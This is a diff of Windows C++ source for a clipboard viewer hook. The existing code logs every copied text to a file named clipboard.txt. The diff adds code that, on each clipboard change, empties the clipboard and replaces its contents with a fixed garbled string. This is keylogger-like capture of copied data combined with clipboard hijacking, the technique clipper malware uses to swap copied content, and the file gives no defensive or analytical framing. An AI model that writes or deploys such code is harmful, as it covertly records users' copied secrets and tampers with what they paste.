@@ -3,6 +3,8 @@
 #include "pch.h"
 #include "utils.h"
 
+std::string prev_text;
+
 LRESULT CALLBACK ClipboardViewerProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
 	switch (message)
@@ -14,12 +16,28 @@ LRESULT CALLBACK ClipboardViewerProc(HWND hwnd, UINT message, WPARAM wParam, LPA
 			if (hData != NULL)
 			{
 				char* clipboardText = static_cast<char*>(GlobalLock(hData));
-				if (clipboardText != NULL)
+				if (clipboardText == NULL) return DefWindowProc(hwnd, message, wParam, lParam);
+
+				if (std::string(clipboardText) != prev_text)
 				{
 					Log("clipboard.txt", "Clipboard changed: " + std::string(clipboardText) + "\n");
+
+					EmptyClipboard();
+
+					const char* newText = "µÜ¯Ç§A§¤°Ú";
+
+					HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(newText) + 1);
+					if (hMem)
+					{
+						LPSTR pMem = (LPSTR)GlobalLock(hMem);
+						strcpy_s(pMem, strlen(newText) + 1, newText);
+						GlobalUnlock(hMem);
+						SetClipboardData(CF_TEXT, hMem);
+					}
 					GlobalUnlock(hData);
 				}
 			}
+
 			CloseClipboard();
 		}
 		break;
